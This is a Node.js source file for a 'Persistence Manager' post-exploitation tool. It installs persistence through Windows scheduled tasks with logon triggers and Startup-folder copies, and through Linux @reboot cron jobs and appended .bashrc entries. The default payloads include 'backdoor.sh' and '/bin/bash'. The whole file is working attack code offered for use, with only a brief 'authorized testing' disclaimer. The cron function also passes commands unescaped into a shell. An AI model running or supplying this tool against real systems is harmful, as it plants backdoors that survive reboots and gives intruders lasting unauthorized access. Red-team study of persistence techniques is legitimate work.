/**
 * Persistence Manager
 * Manages persistence mechanisms for post-exploitation.
 * WARNING: For authorized security testing only!
 */

const fs = require('fs');
const { exec } = require('child_process');
const os = require('os');
const path = require('path');

class PersistenceManager {
    constructor() {
        this.osType = os.platform();
        this.persistenceMethods = [];
    }

    addWindowsScheduledTask(taskName, command, trigger = 'logon') {
        return new Promise((resolve, reject) => {
            if (this.osType !== 'win32') {
                console.log('[-] This method only works on Windows');
                resolve(false);
                return;
            }

            const xmlContent = `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>${command}</Command>
    </Exec>
  </Actions>
</Task>`;

            const xmlFile = `${taskName}.xml`;
            fs.writeFileSync(xmlFile, xmlContent, 'utf8');

            exec(`schtasks /create /tn "${taskName}" /xml "${xmlFile}" /f`, (error) => {
                if (error) {
                    console.log(`[-] Error creating scheduled task: ${error.message}`);
                    resolve(false);
                } else {
                    console.log(`[+] Scheduled task '${taskName}' created`);
                    this.persistenceMethods.push({
                        type: 'scheduled_task',
                        name: taskName,
                        command: command
                    });
                    fs.unlinkSync(xmlFile);
                    resolve(true);
                }
            });
        });
    }

    addLinuxCronJob(command, schedule = '@reboot') {
        return new Promise((resolve, reject) => {
            if (this.osType === 'win32') {
                console.log('[-] This method only works on Linux/Unix');
                resolve(false);
                return;
            }

            const cronEntry = `${schedule} ${command}\n`;

            exec('crontab -l 2>/dev/null', (error, stdout) => {
                const existingCron = stdout || '';
                const newCron = existingCron + cronEntry;

                exec(`echo "${newCron}" | crontab -`, (error) => {
                    if (error) {
                        console.log(`[-] Error adding cron job: ${error.message}`);
                        resolve(false);
                    } else {
                        console.log(`[+] Cron job added: ${schedule} ${command}`);
                        this.persistenceMethods.push({
                            type: 'cron_job',
                            schedule: schedule,
                            command: command
                        });
                        resolve(true);
                    }
                });
            });
        });
    }

    addStartupScriptWindows(scriptPath) {
        return new Promise((resolve, reject) => {
            if (this.osType !== 'win32') {
                console.log('[-] This method only works on Windows');
                resolve(false);
                return;
            }

            const appData = process.env.APPDATA;
            const startupPath = path.join(
                appData,
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            );

            if (!fs.existsSync(startupPath)) {
                fs.mkdirSync(startupPath, { recursive: true });
            }

            const scriptName = path.basename(scriptPath);
            const destPath = path.join(startupPath, scriptName);

            try {
                fs.copyFileSync(scriptPath, destPath);
                console.log(`[+] Startup script added: ${destPath}`);
                this.persistenceMethods.push({
                    type: 'startup_script',
                    path: destPath
                });
                resolve(true);
            } catch (error) {
                console.log(`[-] Error adding startup script: ${error.message}`);
                resolve(false);
            }
        });
    }

    addStartupScriptLinux(scriptPath) {
        return new Promise((resolve, reject) => {
            if (this.osType === 'win32') {
                console.log('[-] This method only works on Linux/Unix');
                resolve(false);
                return;
            }

            const home = os.homedir();
            const bashrc = path.join(home, '.bashrc');

            try {
                const content = fs.readFileSync(bashrc, 'utf8');
                const newContent = content + `\n# Persistence\n${scriptPath}\n`;
                fs.writeFileSync(bashrc, newContent, 'utf8');
                console.log(`[+] Added to ${bashrc}`);
                this.persistenceMethods.push({
                    type: 'startup_script',
                    path: bashrc
                });
                resolve(true);
            } catch (error) {
                console.log(`[-] Error adding startup script: ${error.message}`);
                resolve(false);
            }
        });
    }

    listPersistence() {
        return this.persistenceMethods;
    }

    generateReport() {
        let report = `# Persistence Mechanisms Report\n\n`;
        report += `**OS Type**: ${this.osType}\n\n`;
        report += `## Persistence Methods (${this.persistenceMethods.length})\n\n`;

        this.persistenceMethods.forEach((method, i) => {
            report += `### ${i + 1}. ${method.type}\n\n`;
            for (const [key, value] of Object.entries(method)) {
                if (key !== 'type') {
                    report += `- **${key}**: ${value}\n`;
                }
            }
            report += `\n`;
        });

        return report;
    }
}

async function main() {
    const args = process.argv.slice(2);
    const manager = new PersistenceManager();

    console.log(`[*] OS Type: ${manager.osType}`);
    console.log('[*] Persistence Manager\n');

    if (args.length > 0) {
        const action = args[0];

        if (action === 'scheduled_task' && manager.osType === 'win32') {
            const taskName = args[1] || 'TestTask';
            const command = args[2] || 'calc.exe';
            await manager.addWindowsScheduledTask(taskName, command);
        } else if (action === 'cron' && manager.osType !== 'win32') {
            const command = args[1] || '/bin/bash';
            const schedule = args[2] || '@reboot';
            await manager.addLinuxCronJob(command, schedule);
        } else if (action === 'startup') {
            const scriptPath = args[1] || 'backdoor.sh';
            if (manager.osType === 'win32') {
                await manager.addStartupScriptWindows(scriptPath);
            } else {
                await manager.addStartupScriptLinux(scriptPath);
            }
        } else if (action === 'list') {
            const methods = manager.listPersistence();
            methods.forEach(method => {
                console.log(`[+] ${method.type}:`, method);
            });
        } else {
            console.log('Usage:');
            console.log('  node persistence_manager.js scheduled_task <name> <command>');
            console.log('  node persistence_manager.js cron <command> [schedule]');
            console.log('  node persistence_manager.js startup <script_path>');
            console.log('  node persistence_manager.js list');
        }
    } else {
        console.log('Usage:');
        console.log('  node persistence_manager.js scheduled_task <name> <command>');
        console.log('  node persistence_manager.js cron <command> [schedule]');
        console.log('  node persistence_manager.js startup <script_path>');
        console.log('  node persistence_manager.js list');
    }

    const report = manager.generateReport();
    fs.writeFileSync('persistence_report.md', report, 'utf8');

    console.log(`\n[+] Report saved to persistence_report.md`);
    console.log(`[!] WARNING: Only use on systems you own or have permission to test!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = PersistenceManager;

